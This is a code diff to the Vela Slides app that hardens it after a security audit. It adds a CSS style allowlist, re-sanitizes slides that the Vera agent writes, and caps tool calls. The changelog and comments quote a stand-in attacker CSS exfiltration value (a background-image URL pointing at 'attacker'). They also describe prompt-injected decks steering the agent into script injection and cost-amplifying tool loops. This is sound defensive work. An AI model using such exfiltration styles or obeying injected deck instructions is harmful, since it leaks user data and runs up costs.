@@ -69,8 +69,9 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.49";
+const VELA_VERSION = "12.50";
 const VELA_CHANGELOG = [
+  { v: "12.50", d: "Security (audit 2025-05 — Critical/High hardening): (H1) LOAD_LANES reducer now re-sanitizes every slide via sanitizeSlide — Vera's 20-tool ReAct writes (set_slides/add_slide/edit_slide) round-trip through LOAD_LANES, the only ingest path that previously skipped sanitization. (H2) New sanitizeStyle() + SAFE_STYLE_KEYS allowlist: block.style and item.style were typecheck-only, allowing `backgroundImage: url('https://attacker/?d=...')` as a zero-click CSS exfil channel with no CSP backstop inside the artifact srcdoc. Allowlist excludes image-loading keys (background, backgroundImage, borderImage, listStyleImage, cursor, content, mask, filter, font shorthand) and rejects any value containing url()/expression()/image-set()/CSS-escape/angle-bracket even when the key is allowlisted. (H5) ReAct loop now caps tool_calls/turn (16), session-total tools (40), and cumulative messages payload (200 KB) to prevent prompt-injection cost-amplification DoS." },
   { v: "12.49", d: "Tests: complete XSS/deck-load regression coverage. Added 10 CI-gating source assertions (SVG_BLOCKED_TAGS + SMIL family, CDATA/comment node strip, control-char scheme normalization, lane clamp-not-throw, fail-closed deck-load fallbacks, IMPORT_CONCEPTS sanitizeSlide, openExternalLink sink + no raw window.open of deck links, item-level link sanitization) and new in-browser uitest cases (entity-encoded javascript: schemes, tag reconstruction, unclosed iframe/embed/script/foreignObject, vbscript via xlink:href, and a Deck Sanitization suite covering >50-lane clamp + non-whitelisted block drop)." },
   { v: "12.48", d: "Security (defense-in-depth): block the full SMIL animation family in SVG_BLOCKED_TAGS — added animateTransform, animateMotion, animateColor and mpath alongside the existing animate/set. Their on* event handlers were already stripped (so they were inert, not exploitable), but removing the elements outright eliminates any residual SMIL animation surface (e.g. animating an attribute toward a dangerous value) and matches the treatment of <animate>. Static presentation diagrams don't use SMIL." },
   { v: "12.47", d: "Security (High): fix fail-open deck sanitization. validateAndSanitizeDeck() threw on >50 lanes, and three callers (applyStartupPatch, the serve.py local-sync push, and the merge dialog) caught the throw and dispatched the RAW unsanitized deck — so the lane limit doubled as a sanitizer off-switch (unsanitized style/clickjacking overlays, non-whitelisted blocks, oversized payloads reached render state). Now: (1) the lane count is clamped via slice(0,50) instead of thrown, removing the weaponizable trigger, and (2) all three fallbacks fail closed — they log and skip instead of loading raw. Also sanitize IMPORT_CONCEPTS slides in the reducer (chat-paste {concepts:[…]} / bare-array path previously bypassed validateAndSanitizeDeck)." },
@@ -386,6 +387,49 @@ function sanitizeSvgMarkup(raw) {
   } catch (_) { return ""; }
 }
 
+// SECURITY (audit 2025-05, H2): block.style was previously typecheck-only,
+// which let a deck (or a Vera prompt-injected tool call) ship CSS values
+// like `backgroundImage: url('https://attacker/?d=...')`. Inline styles
+// fire an outbound GET on every render with no CSP backstop inside the
+// artifact srcdoc — a zero-click data-exfil channel. We now apply both an
+// allowlist of safe CSS keys (text/layout/color, no image-loading) AND a
+// value filter that rejects url() / expression() / image-set() / CSS
+// escapes / angle brackets, even on allowlisted keys.
+const SAFE_STYLE_KEYS = new Set([
+  // text
+  "color", "fontWeight", "fontStyle", "fontSize", "fontFamily",
+  "letterSpacing", "lineHeight", "textAlign", "textTransform",
+  "textDecoration", "whiteSpace", "wordBreak", "overflowWrap",
+  // layout
+  "display", "flexDirection", "alignItems", "justifyContent", "gap",
+  "padding", "paddingTop", "paddingRight", "paddingBottom", "paddingLeft",
+  "margin", "marginTop", "marginRight", "marginBottom", "marginLeft",
+  "width", "height", "minWidth", "minHeight", "maxWidth", "maxHeight",
+  "boxSizing", "flex", "flexGrow", "flexShrink", "flexBasis", "flexWrap",
+  "gridTemplateColumns", "gridTemplateRows", "gridColumn", "gridRow",
+  // box
+  "backgroundColor", "borderRadius",
+  "borderTop", "borderRight", "borderBottom", "borderLeft",
+  "borderColor", "borderStyle", "borderWidth",
+  "boxShadow", "opacity",
+]);
+const STYLE_VALUE_REJECT = /url\s*\(|expression\s*\(|image-set\s*\(|<|\\/i;
+function sanitizeStyle(style) {
+  if (!style || typeof style !== "object" || Array.isArray(style)) return undefined;
+  const out = {};
+  for (const k of Object.keys(style)) {
+    if (!SAFE_STYLE_KEYS.has(k)) continue;
+    const v = style[k];
+    if (typeof v === "number" && Number.isFinite(v)) { out[k] = v; continue; }
+    if (typeof v === "string") {
+      if (v.length > 200) continue;
+      if (STYLE_VALUE_REJECT.test(v)) continue;
+      out[k] = v;
+    }
+  }
+  return out;
+}
+
 function sanitizeBlock(block) {
   if (!block || typeof block !== "object" || Array.isArray(block)) return null;
   if (!SAFE_BLOCK_TYPES.has(block.type)) return null;
@@ -466,12 +510,21 @@ function sanitizeBlock(block) {
     // in href/xlink:href survived it, yielding stored XSS on click.
     clean.markup = typeof clean.markup === "string" ? sanitizeSvgMarkup(clean.markup.slice(0, 50000)) : "";
   }
-  // Guard: style must be a plain object, never an array or primitive
-  if (clean.style && (typeof clean.style !== "object" || Array.isArray(clean.style))) delete clean.style;
+  // Guard: style must be allowlisted CSS keys with non-url values — see
+  // sanitizeStyle (audit 2025-05, H2 CSS-exfil fix).
+  if ("style" in clean) {
+    const s = sanitizeStyle(clean.style);
+    if (s && Object.keys(s).length) clean.style = s;
+    else delete clean.style;
+  }
   if (Array.isArray(clean.items)) {
     clean.items = clean.items.map(it => {
-      if (it && typeof it === "object" && it.style && (typeof it.style !== "object" || Array.isArray(it.style))) {
-        const c = { ...it }; delete c.style; return c;
+      if (it && typeof it === "object" && "style" in it) {
+        const s = sanitizeStyle(it.style);
+        const c = { ...it };
+        if (s && Object.keys(s).length) c.style = s;
+        else delete c.style;
+        return c;
       }
       return it;
     });
@@ -2642,7 +2695,22 @@ function innerReducer(state, a) {
     }
     case "SET_LOADING": return { ...state, chatLoading: a.value };
     case "SET_DEBUG": return { ...state, lastDebug: a.text };
-    case "LOAD_LANES": return { ...state, lanes: a.lanes };
+    case "LOAD_LANES": {
+      // SECURITY (audit 2025-05, H1): Vera tool writes (set_slides / add_slide /
+      // edit_slide / clear_all) dispatch through LOAD_LANES — the only ingest
+      // path that previously skipped sanitizeSlide. Prompt-injected blocks
+      // could write SVG markup with <script>, dangerous CSS in block.style,
+      // or attacker-host image src. Re-sanitize defensively on every Vera
+      // write so the SVG/render sinks aren't the only backstop.
+      const safeLanes = Array.isArray(a.lanes) ? a.lanes.map((l) => ({
+        ...l,
+        items: Array.isArray(l?.items) ? l.items.map((it) => ({
+          ...it,
+          slides: Array.isArray(it?.slides) ? it.slides.map(sanitizeSlide).filter(Boolean) : [],
+        })) : [],
+      })) : state.lanes;
+      return { ...state, lanes: safeLanes };
+    }
     case "SET_BRANDING": return { ...state, branding: { ...state.branding, ...a.branding } };
     case "SET_GUIDELINES": return { ...state, guidelines: a.guidelines };
     case "RESET": return { ...init, chatOpen: state.chatOpen };
@@ -2716,6 +2784,17 @@ function reducer(hist, a) {
 // © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
 // ━━━ Vera Agentic Engine ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 // Tool-use ReAct loop with shared API helpers
+
+// SECURITY (audit 2025-05, H5 cost-amplification DoS): the ReAct loop must
+// cap not just iteration count, but also tool-calls per turn, total tool
+// calls across the session, and the cumulative messages-payload size. A
+// prompt-injected deck can otherwise instruct Vera to emit thousands of
+// tool calls per turn (e.g. "verify each slide with find_slides 200 times"),
+// blowing up output tokens × 12 iterations. With max_tokens=16000 and
+// Sonnet-4 pricing, this is a real money/latency DoS vector.
+const MAX_TOOLS_PER_TURN = 16;
+const MAX_TOTAL_TOOLS = 40;
+const MAX_MESSAGES_BYTES = 200 * 1024;
 
 // ━━━ Shared API Helpers (deduped from 3 copies) ━━━━━━━━━━━━━━━━━━━
 async function callClaudeAPI(sysPrompt, messages, { temperature = 0, maxTokens = 16000, timeoutMs = 30000, _callType = "chat" } = {}) {
@@ -3717,13 +3796,28 @@ async function callVera(msg, lanes, selectedId, slideIndex, onUpdate, chatImages
 
     if (onToolCall) onToolCall({ type: "thinking" });
 
+    let capHit = "";
     for (let iter = 0; iter < 12; iter++) {
       const parsed = await callVeraStep(sysPrompt, messages);
       const calls = parsed.tool_calls || [];
       if (calls.length === 0) { finalText = parsed.message || finalText || "Done. 🖖"; break; }
 
+      // SECURITY (H5): cap tool_calls per turn to limit cost-amplification
+      // via prompt injection. Excess calls are dropped this turn; the loop
+      // continues so legitimate progress isn't blocked.
+      const safeCalls = calls.slice(0, MAX_TOOLS_PER_TURN);
+      if (calls.length > MAX_TOOLS_PER_TURN) {
+        dbg(`[⚠️ cap] tool_calls/turn ${calls.length} > ${MAX_TOOLS_PER_TURN}; truncating`);
+        capHit = `tool_calls/turn cap (${MAX_TOOLS_PER_TURN})`;
+      }
+
       const results = [];
-      for (const tc of calls) {
+      for (const tc of safeCalls) {
+        if (totalTools >= MAX_TOTAL_TOOLS) {
+          dbg(`[⚠️ cap] total tools >= ${MAX_TOTAL_TOOLS}; stopping`);
+          capHit = `total tools cap (${MAX_TOTAL_TOOLS})`;
+          break;
+        }
         totalTools++;
         const toolName = tc.tool || tc.name;
         const toolInput = tc.input || tc.params || tc;
@@ -3752,8 +3846,20 @@ async function callVera(msg, lanes, selectedId, slideIndex, onUpdate, chatImages
       const boardSummary = boardMatch ? boardMatch[0].slice(0, 2000) : "";
       messages.push({ role: "user", content: `Tool results:\n${results.map((r) => `${r.tool}: ${r.result}`).join("\n")}\n\n${boardSummary ? `Updated board state (after your changes):\n${boardSummary}\n\n` : ""}Evaluate: did your tool calls achieve the user's goal? If not, continue with more tool_calls. If YES, respond with {"message": "summary of what you did"}. Do NOT stop halfway — if the user asked to change 10 things and you've done 3, keep going.` });
 
+      // SECURITY (H5): bound cumulative messages payload to prevent unbounded
+      // input-token growth across iterations.
+      let msgBytes = 0;
+      for (const m of messages) { const c = m.content; msgBytes += typeof c === "string" ? c.length : JSON.stringify(c || "").length; }
+      if (msgBytes > MAX_MESSAGES_BYTES) {
+        dbg(`[⚠️ cap] messages bytes ${msgBytes} > ${MAX_MESSAGES_BYTES}; stopping ReAct loop`);
+        capHit = `messages-bytes cap (${MAX_MESSAGES_BYTES})`;
+        break;
+      }
+      if (totalTools >= MAX_TOTAL_TOOLS) break;
+
       if (onToolCall) onToolCall({ type: "thinking" });
     }
+    if (capHit && !finalText) finalText = `Stopped at ${capHit}. Run again to continue. 🖖`;
 
     if (!finalText && totalTools > 0) finalText = `Applied ${totalTools} tool calls across ${Math.ceil(messages.length / 2)} turns. 🖖`;
 
